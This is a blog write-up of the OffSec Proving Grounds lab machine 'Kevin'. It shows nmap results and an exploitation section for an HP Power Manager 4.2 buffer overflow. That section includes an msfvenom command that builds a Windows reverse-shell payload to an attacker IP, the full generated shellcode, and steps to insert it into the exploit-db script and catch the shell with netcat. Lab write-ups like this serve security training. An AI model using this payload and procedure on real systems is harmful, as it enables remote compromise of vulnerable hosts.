@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Practice: Kevin</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Practice: Kevin | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Practice: Kevin" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds practice windows machine writeup" />
+<meta property="og:description" content="Offsec proving grounds practice windows machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/08/28/Proving_grounds_Practice-Kevin.html" />
+<meta property="og:url" content="http://localhost:4000/2023/08/28/Proving_grounds_Practice-Kevin.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-08-28T01:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Practice: Kevin" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-08-28T01:00:00+05:30","datePublished":"2023-08-28T01:00:00+05:30","description":"Offsec proving grounds practice windows machine writeup","headline":"Proving grounds Practice: Kevin","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/08/28/Proving_grounds_Practice-Kevin.html"},"url":"http://localhost:4000/2023/08/28/Proving_grounds_Practice-Kevin.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/08/28/Proving_grounds_Practice-Kevin.html">
+    <h2 class="post-title">Proving grounds Practice: Kevin</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Aug 28, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap
+PORT      STATE SERVICE            VERSION
+80/tcp    open  http               GoAhead WebServer
+|_http-server-header: GoAhead-Webs
+| http-title: HP Power Manager
+|_Requested resource was http://192.168.174.45/index.asp
+| http-methods: 
+|_  Supported Methods: GET HEAD
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows 7 Ultimate N 7600 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+3389/tcp  open  ssl/ms-wbt-server?
+3573/tcp  open  tag-ups-1?
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+49159/tcp open  msrpc              Microsoft Windows RPC
+</code></pre></div></div>
+
+<h2 id="port--80--web">PORT : 80 : Web</h2>
+
+<p>HP Power Manager 4.2 (Build 7)</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Kevin/web.png" alt="img" /></p>
+
+<p>HP Power Manager 4.2 (Build 7) is vulnerable to <a href="https://www.exploit-db.com/exploits/10099">Buffer Overflow Attack</a>.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Download the <a href="https://www.exploit-db.com/exploits/10099">Exploit</a> from exploitDB.</p>
+
+<p>Create a shellcode using <code class="language-plaintext highlighter-rouge">tun0</code> IP and local PORT to listen for reverse connection.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.45.156 <span class="nv">LPORT</span><span class="o">=</span>443  <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s1">'\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5'</span> x64/alpha_mixed <span class="nt">--platform</span> windows <span class="nt">-f</span> c
+</code></pre></div></div>
+
+<p><strong>Generated Buffer</strong></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
+"\x0e\x93\x99\xf7\xc4\x83\xee\xfc\xe2\xf4\x6f\x71\x75\xc4"
+"\x93\x99\x97\x4d\x76\xa8\x37\xa0\x18\xc9\xc7\x4f\xc1\x95"
+"\x7c\x96\x87\x12\x85\xec\x9c\x2e\xbd\xe2\xa2\x66\x5b\xf8"
+"\xf2\xe5\xf5\xe8\xb3\x58\x38\xc9\x92\x5e\x15\x36\xc1\xce"
+"\x7c\x96\x83\x12\xbd\xf8\x18\xd5\xe6\xbc\x70\xd1\xf6\x15"
+"\xc2\x12\xae\xe4\x92\x4a\x7c\x8d\x8b\x7a\xcd\x8d\x18\xad"
+"\x7c\xc5\x45\xa8\x08\x68\x52\x56\xfa\xc5\x54\xa1\x17\xb1"
+"\x65\x9a\x8a\x3c\xa8\xe4\xd3\xb1\x77\xc1\x7c\x9c\xb7\x98"
+"\x24\xa2\x18\x95\xbc\x4f\xcb\x85\xf6\x17\x18\x9d\x7c\xc5"
+"\x43\x10\xb3\xe0\xb7\xc2\xac\xa5\xca\xc3\xa6\x3b\x73\xc6"
+"\xa8\x9e\x18\x8b\x1c\x49\xce\xf1\xc4\xf6\x93\x99\x9f\xb3"
+"\xe0\xab\xa8\x90\xfb\xd5\x80\xe2\x94\x66\x22\x7c\x03\x98"
+"\xf7\xc4\xba\x5d\xa3\x94\xfb\xb0\x77\xaf\x93\x66\x22\x94"
+"\xc3\xc9\xa7\x84\xc3\xd9\xa7\xac\x79\x96\x28\x24\x6c\x4c"
+"\x60\xae\x96\xf1\x37\x6c\xbe\x05\x9f\xc6\x93\x98\x4c\x4d"
+"\x75\xf3\xe7\x92\xc4\xf1\x6e\x61\xe7\xf8\x08\x11\x16\x59"
+"\x83\xc8\x6c\xd7\xff\xb1\x7f\xf1\x07\x71\x31\xcf\x08\x11"
+"\xfb\xfa\x9a\xa0\x93\x10\x14\x93\xc4\xce\xc6\x32\xf9\x8b"
+"\xae\x92\x71\x64\x91\x03\xd7\xbd\xcb\xc5\x92\x14\xb3\xe0"
+"\x83\x5f\xf7\x80\xc7\xc9\xa1\x92\xc5\xdf\xa1\x8a\xc5\xcf"
+"\xa4\x92\xfb\xe0\x3b\xfb\x15\x66\x22\x4d\x73\xd7\xa1\x82"
+"\x6c\xa9\x9f\xcc\x14\x84\x97\x3b\x46\x22\x17\xd9\xb9\x93"
+"\x9f\x62\x06\x24\x6a\x3b\x46\xa5\xf1\xb8\x99\x19\x0c\x24"
+"\xe6\x9c\x4c\x83\x80\xeb\x98\xae\x93\xca\x08\x11"
+</code></pre></div></div>
+
+<p>Replace the above buffer values in the exploit code.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SHELL</span> <span class="o">=</span> <span class="p">(</span>
+<span class="sh">"</span><span class="s">n00bn00b</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x0e\x93\x99\xf7\xc4\x83\xee\xfc\xe2\xf4\x6f\x71\x75\xc4</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x93\x99\x97\x4d\x76\xa8\x37\xa0\x18\xc9\xc7\x4f\xc1\x95</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x7c\x96\x87\x12\x85\xec\x9c\x2e\xbd\xe2\xa2\x66\x5b\xf8</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xf2\xe5\xf5\xe8\xb3\x58\x38\xc9\x92\x5e\x15\x36\xc1\xce</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x7c\x96\x83\x12\xbd\xf8\x18\xd5\xe6\xbc\x70\xd1\xf6\x15</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xc2\x12\xae\xe4\x92\x4a\x7c\x8d\x8b\x7a\xcd\x8d\x18\xad</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x7c\xc5\x45\xa8\x08\x68\x52\x56\xfa\xc5\x54\xa1\x17\xb1</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x65\x9a\x8a\x3c\xa8\xe4\xd3\xb1\x77\xc1\x7c\x9c\xb7\x98</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x24\xa2\x18\x95\xbc\x4f\xcb\x85\xf6\x17\x18\x9d\x7c\xc5</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x43\x10\xb3\xe0\xb7\xc2\xac\xa5\xca\xc3\xa6\x3b\x73\xc6</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xa8\x9e\x18\x8b\x1c\x49\xce\xf1\xc4\xf6\x93\x99\x9f\xb3</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xe0\xab\xa8\x90\xfb\xd5\x80\xe2\x94\x66\x22\x7c\x03\x98</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xf7\xc4\xba\x5d\xa3\x94\xfb\xb0\x77\xaf\x93\x66\x22\x94</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xc3\xc9\xa7\x84\xc3\xd9\xa7\xac\x79\x96\x28\x24\x6c\x4c</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x60\xae\x96\xf1\x37\x6c\xbe\x05\x9f\xc6\x93\x98\x4c\x4d</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x75\xf3\xe7\x92\xc4\xf1\x6e\x61\xe7\xf8\x08\x11\x16\x59</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x83\xc8\x6c\xd7\xff\xb1\x7f\xf1\x07\x71\x31\xcf\x08\x11</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xfb\xfa\x9a\xa0\x93\x10\x14\x93\xc4\xce\xc6\x32\xf9\x8b</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xae\x92\x71\x64\x91\x03\xd7\xbd\xcb\xc5\x92\x14\xb3\xe0</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x83\x5f\xf7\x80\xc7\xc9\xa1\x92\xc5\xdf\xa1\x8a\xc5\xcf</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xa4\x92\xfb\xe0\x3b\xfb\x15\x66\x22\x4d\x73\xd7\xa1\x82</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x6c\xa9\x9f\xcc\x14\x84\x97\x3b\x46\x22\x17\xd9\xb9\x93</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x9f\x62\x06\x24\x6a\x3b\x46\xa5\xf1\xb8\x99\x19\x0c\x24</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xe6\x9c\x4c\x83\x80\xeb\x98\xae\x93\xca\x08\x11</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Run netcat listerner on the PORT which was used in the above payload.</p>
+
+<p>Run the exploit using <code class="language-plaintext highlighter-rouge">python2</code> and the reverse connetion will be obtained in few seconds.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Kevin/shell.png" alt="img" /></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
